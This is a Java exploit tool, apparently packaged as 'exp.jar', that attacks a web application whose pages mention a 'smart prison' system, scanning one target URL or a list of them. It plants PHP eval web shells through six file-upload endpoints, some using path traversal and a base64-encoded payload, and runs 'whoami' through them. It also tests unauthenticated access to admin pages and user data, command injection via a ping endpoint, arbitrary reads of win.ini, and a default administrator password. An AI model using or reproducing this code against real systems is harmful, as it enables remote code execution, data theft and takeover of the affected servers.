import com.alibaba.fastjson.JSON;
import com.github.kevinsawicki.http.HttpRequest;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Random;

public class main {
    private static HttpRequest request = HttpRequest.get("http://www.baidu.com")  ;
    private static HttpRequest request1 = HttpRequest.get("http://www.baidu.com");

    public static String getRandomString(int length) {

        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();

        for (int i = 0; i < length; i++) {
            int index = random.nextInt(characters.length());
            sb.append(characters.charAt(index));
        }

        return sb.toString();
    }
    public static String getInfo(String args){
        try {
            request = HttpRequest.get(args+"/manifest.json").trustAllHosts().trustAllCerts();
//            if(request.code()==200){
                String a = request.body();
                String b = JSON.parseObject(a).get("short_name").toString();
                return b;
//            }


        }catch (Exception e){}

        return null;
    }

    public static String upload1(String args){
        String filename = getRandomString(8)+".php";
        String data =
                "------WebKitFormBoundary9PggsiM755PLa54a\r\n" +
                "Content-Disposition: form-data; name=\"upload\"; filename=\""+filename+"\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                "<?php @eval($_REQUEST['R4gd0ll']);?>\r\n" +
                "------WebKitFormBoundary9PggsiM755PLa54a--\r\n";
        try {
            request = HttpRequest.post(args+"/upload/my_parser.php")
                    .header("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a")
                    .send(data).trustAllCerts().trustAllHosts().connectTimeout(1000);
//            System.out.println(request.code());
            if(request.code() == 200){
                request1 = HttpRequest.get(args+"/upload/files/"+filename+"?R4gd0ll=system(\"whoami\");").trustAllCerts().trustAllHosts();
                String f = request1.body();
                if(request1.code() == 200){
                    System.out.println("[+]upload1: "+args+"/upload/my_parser.php,"+args+"/upload/files/"+filename);
                    System.out.println(f);
                    return null;
                }else {
                    System.out.println("[-]: 不存在upload1漏洞");
                }
            }else {
                System.out.println("[-]: 不存在upload1漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String upload2(String args){
        String filename = getRandomString(8)+".php";
        String data =
                "------WebKitFormBoundary9PggsiM755PLa54a\r\n" +
                        "Content-Disposition: form-data; name=\"upload\"; filename=\""+filename+"\"\r\n" +
                        "Content-Type: application/octet-stream\r\n" +
                        "\r\n" +
                        "<?php @eval($_REQUEST['R4gd0ll']);?>\r\n" +
                        "------WebKitFormBoundary9PggsiM755PLa54a--\r\n";
        try {
            request = HttpRequest.post(args+"/php/addscenedata.php")
                    .header("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a")
                    .send(data).trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200){
                request1 = HttpRequest.get(args+"/images/scene/"+filename+"?R4gd0ll=system(\"whoami\");").trustAllCerts().trustAllHosts();
                String f = request1.body();
                if(request1.code() == 200){
                    System.out.println("[+]upload2: "+args+"/php/addscenedata.php,"+args+"/images/scene/"+filename);
                    System.out.println(f);
                    return null;
                }else {
                    System.out.println("[-]: 不存在upload2漏洞");
                }
            }else {
                System.out.println("[-]: 不存在upload2漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String upload3(String args){
        String filename = getRandomString(8)+".php";
        String data =
                "------WebKitFormBoundary9PggsiM755PLa54a\r\n" +
                "Content-Disposition: form-data; name=\"fullpath\"\r\n" +
                "\r\n" +
                "../\r\n" +
                "------WebKitFormBoundary9PggsiM755PLa54a\r\n" +
                "Content-Disposition: form-data; name=\"subpath\"\r\n" +
                "\r\n" +
                "/\r\n"+
                "------WebKitFormBoundary9PggsiM755PLa54a\r\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\""+filename+"\"\r\n" +
                "Content-Type: application/octet-stream\r\n" +
                "\r\n" +
                "<?php @eval($_REQUEST['R4gd0ll']);?>\r\n" +
                "------WebKitFormBoundary9PggsiM755PLa54a--\r\n";
        try {
            request = HttpRequest.post(args+"/php/addmediadata.php")
                    .header("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a")
                    .send(data).trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200){
                request1 = HttpRequest.get(args+"/"+filename+"?R4gd0ll=system(\"whoami\");").trustAllCerts().trustAllHosts();
                String f = request1.body();
                if(request1.code() == 200){
                    System.out.println("[+]upload3: "+args+"/php/addmediadata.php,"+args+"/"+filename);
                    System.out.println(f);
                    return null;
                }
                else {
                    System.out.println("[-]: 不存在upload3漏洞");
                }
            }else {
                System.out.println("[-]: 不存在upload3漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String upload4(String args){
        String filename = getRandomString(8)+".php";
        String data =
                "jsondata[filename]="+filename+"&jsondata[data]=<?php @eval($_REQUEST['R4gd0ll']);?>";
        try {
            request = HttpRequest.post(args+"/php/uploadjson.php")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data).trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200){
                request1 = HttpRequest.get(args+"/lan/"+filename+"?R4gd0ll=system(\"whoami\");").trustAllCerts().trustAllHosts();
                String f = request1.body();
                if(request1.code() == 200){
                    System.out.println("[+]upload4: "+args+"/php/uploadjson.php,"+args+"/lan/"+filename);
                    System.out.println(f);
                    return null;
                }else {
                    System.out.println("[-]: 不存在upload4漏洞");
                }
            }else {
                System.out.println("[-]: 不存在upload4漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String upload5(String args){
        String filename = "1_2_1"+getRandomString(1)+".php";
        String data =
                "jsondata[caller]=1&jsondata[callee]=../../../../../ICPAS/Wnmp/WWW/php/&jsondata[imagename]="+filename+"&jsondata[imagecontent]=PD9waHAgQGV2YWwoJF9SRVFVRVNUWydSNGdkMGxsJ10pOw==";
        try {
            request = HttpRequest.post(args+"/php/busyscreenshotpush.php")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data).trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200){
                request1 = HttpRequest.get(args+"/php/"+filename+"?R4gd0ll=system(\"whoami\");").trustAllCerts().trustAllHosts();
                String f = request1.body();
                if(request1.code() == 200){
                    System.out.println("[+]upload5: "+args+"/php/busyscreenshotpush.php,"+args+"/php/"+filename);
                    System.out.println(f);
                    return null;
                }
                else {
                    System.out.println("[-]: 不存在upload5漏洞");
                }
            }else {
                System.out.println("[-]: 不存在upload5漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String upload6(String args){
        String filename = "1_2_2"+getRandomString(1)+".php";
        String data =
                "jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=1_2_3.php&jsondata[videocontent]=PD9waHAgQGV2YWwoJF9SRVFVRVNUWydSNGdkMGxsJ10pOw==";
        try {
            request = HttpRequest.post(args+"/php/videobacktrackpush.php")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data).trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200){
                request1 = HttpRequest.get(args+"/php/"+filename+"?R4gd0ll=system(\"whoami\");").trustAllCerts().trustAllHosts();
                String f = request1.body();
                if(request1.code() == 200){
                    System.out.println("[+]upload6: "+args+"/php/videobacktrackpush.php,"+args+"/php/"+filename);
                    System.out.println(f);
                    return null;
                }else {
                    System.out.println("[-]: 不存在upload6漏洞");
                }
            }else {
                System.out.println("[-]: 不存在upload6漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String unauth1(String args){

        try {
            request = HttpRequest.get(args+"/prison/index.html")
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200 && request.body().contains("智慧监狱")){
                    System.out.println("[+]unauth1: "+args+"/prison/index.html");
                return null;

            }else{
                System.out.println("[-]: 不存在unauth1漏洞");
            }

        }catch (Exception e){}

        return null;
    }



    public static String unauth2(String args){
        String data = "jsondata[pageIndex]=0&jsondata[pageCount]=30";
        try {
            request = HttpRequest.post(args+"/php/getuserdata.php")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data)
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200 && request.body().contains("username")){
                System.out.println("[+]unauth3: "+args+"/php/getuserdata.php");
                return null;

            }else{
                System.out.println("[-]: 不存在unauth2漏洞");
            }

        }catch (Exception e){}

        return null;
    }
    public static String unauth3(String args){

        try {
            request = HttpRequest.get(args+"/html/system.html")
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200 ){
                System.out.println("[+]unauth3: "+args+"/html/system.html");
                return null;

            }else{
                System.out.println("[-]: 不存在unauth3漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String unauth4(String args){

        try {
            request = HttpRequest.get(args+"/html/factory.html")
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200 ){
                System.out.println("[+]unauth4: "+args+"/html/factory.html");
                return null;

            }else {
                System.out.println("[-]: 不存在unauth4漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String unauth5(String args){
        String data = "jsondata[pageIndex]=0&jsondata[pageCount]=300&jsondata[groupName]=*&jsondata[showType]=0&jsondata[user]=administrator&jsondata[simple]=1&jsondata[currentUser]=administrator&jsondata[token]=SESSION";
        try {
            request = HttpRequest.get(args+"/php/getzoneterminaldata.php")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data)
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            String f = request.body();
            if(request.code() == 200 && f.contains("name")){
                System.out.println("[+]unauth5: "+args+"/php/getzoneterminaldata.php");

            }else{
                System.out.println("[-]: 不存在unauth5漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String rce1(String args){
        String data = "jsondata%5Btype%5D=123&jsondata%5Bip%5D=ipconfig";
        try {
            request = HttpRequest.post(args+"/php/ping")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data)
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            String f = request.body();
            if(request.code() == 200 && f.contains("IP")){
                System.out.println("[+]: "+args+"/php/ping");
                System.out.println(f);
                return null;

            }

        }catch (Exception e){}
        System.out.println("[-]: 不存在rce1漏洞");
        return null;
    }

    public static String fileread1(String args){

        try {
            request = HttpRequest.get(args+"/php/exportrecord.php?downtype=10&downname=C:\\\\windows\\\\win.ini")
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);

          String f = request.body();
            if(request.code() == 200 && f.contains("16-bit")){
                System.out.println("[+]fileread1: "+args+"/php/exportrecord.php?downtype=10&downname=C:\\\\windows\\\\win.ini");
                System.out.println(f);
                return null;

            }else{
                System.out.println("[-]: 不存在fileread1漏洞");
            }

        }catch (Exception e){}
//
        return null;
    }

    public static String fileread2(String args){
        String data = "jsondata[filename]=c:/windows/win.ini";
        try {
            request = HttpRequest.post(args+"/php/getjson.php")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data)
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            String f = request.body();
            if(request.code() == 200 && f.contains("16-bit")){
                System.out.println("[+]fileread2: "+args+"/php/getjson.php");
                System.out.println(f);
                return null;

            }else {
                System.out.println("[-]: 不存在fileread2漏洞");
            }

        }catch (Exception e){}

        return null;
    }

    public static String fileread3(String args){
        String data = "jsondata[url]=c:/windows/win.ini";
        try {
            request = HttpRequest.post(args+"/php/rj_get_token.php")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data)
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            String f = request.body();
            if(request.code() == 200 && f.contains("16-bit")){
                System.out.println("[+]fileread3: "+args+"/php/rj_get_token.php");
                System.out.println(f);
                return null;

            }else {
                System.out.println("[-]: 不存在fileread3漏洞");
            }

        }catch (Exception e){}

        return null;
    }
    public static String passwd1(String args){
        String data = "jsondata%5Busername%5D=administrator&jsondata%5Bpassword%5D=800823&jsondata%5Bisencrypted%5D=0";
        try {
            request = HttpRequest.post(args+"/php/login.php")
                    .header("Content-Type","application/x-www-form-urlencoded")
                    .send(data)
                    .trustAllCerts().trustAllHosts().connectTimeout(1000);
            if(request.code() == 200 && request.body().contains("administrator")){
                System.out.println("[+]: "+args+"/php/login.php,administrator,800823");
                return null;

            }

        }catch (Exception e){}
        System.out.println("[-]: 不存在passwd1漏洞");
        return null;
    }

    public static void go(String filename){
        if(getInfo(filename) == null){
            System.out.println(filename+"未检测到版本");
            System.exit(0);
        }
        System.out.println(filename+"版本: "+getInfo(filename));
        System.out.println("----------------------------------------------------------------------");
        upload1(filename);
        System.out.println("----------------------------------------------------------------------");
        upload2(filename);
        System.out.println("----------------------------------------------------------------------");
        upload3(filename);
        System.out.println("----------------------------------------------------------------------");
        upload4(filename);
        System.out.println("----------------------------------------------------------------------");
        upload5(filename);
        System.out.println("----------------------------------------------------------------------");
        upload6(filename);
        System.out.println("----------------------------------------------------------------------");
        unauth1(filename);
        System.out.println("----------------------------------------------------------------------");
        unauth2(filename);
        System.out.println("----------------------------------------------------------------------");
        unauth3(filename);
        System.out.println("----------------------------------------------------------------------");
        unauth4(filename);
        System.out.println("----------------------------------------------------------------------");
        unauth5(filename);
        System.out.println("----------------------------------------------------------------------");
        fileread1(filename);
        System.out.println("----------------------------------------------------------------------");
        fileread2(filename);
        System.out.println("----------------------------------------------------------------------");
        fileread3(filename);
        System.out.println("----------------------------------------------------------------------");
        passwd1(filename);
        System.out.println("----------------------------------------------------------------------");
        rce1(filename);
        System.out.println("----------------------------------------------------------------------");
    }

    public static void main(String[] args) {
        CommandLine cmdLine = null;
        Options options = new Options();
        options.addOption("t", "target", true, "Url or FilePath");
        options.addOption("ph", "pHost", true, "proxyHost");
        options.addOption("pp", "pPort", true, "proxyPort");
        CommandLineParser parser = new DefaultParser();
        if(args.length == 0){
            System.out.println("[*] java -jar exp.jar -t [url|filePath] <-ph [127.0.0.1] -pp [8080]>");
            System.exit(1);
        }
        try {
            cmdLine = parser.parse(options, args);
        } catch (Exception e) {
            System.out.println("[*] java -jar exp.jar -t [url|filePath] <-ph [127.0.0.1] -pp [8080]>");
            System.exit(1);
        }

        if(cmdLine.hasOption("pHost") && cmdLine.hasOption("pPort")){
            request.proxyHost(cmdLine.getOptionValue("pHost"));
            request1.proxyHost(cmdLine.getOptionValue("pHost"));
            request.proxyPort(Integer.parseInt(cmdLine.getOptionValue("pPort")));
            request1.proxyPort(Integer.parseInt(cmdLine.getOptionValue("pPort")));
        }


        String filePath = cmdLine.getOptionValue("target"); // 请替换为实际文件路径
        if (filePath.startsWith("http")) {
            go(filePath);
//            upload1(filePath);
            return;
        } else {
            try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
                String line;
                // 逐行读取文件内容
                while ((line = reader.readLine()) != null) {
                    go(line);

                }
            } catch (IOException e) {
                System.err.println("读取文件时出错: " + e.getMessage());
            }
        }
    }
}
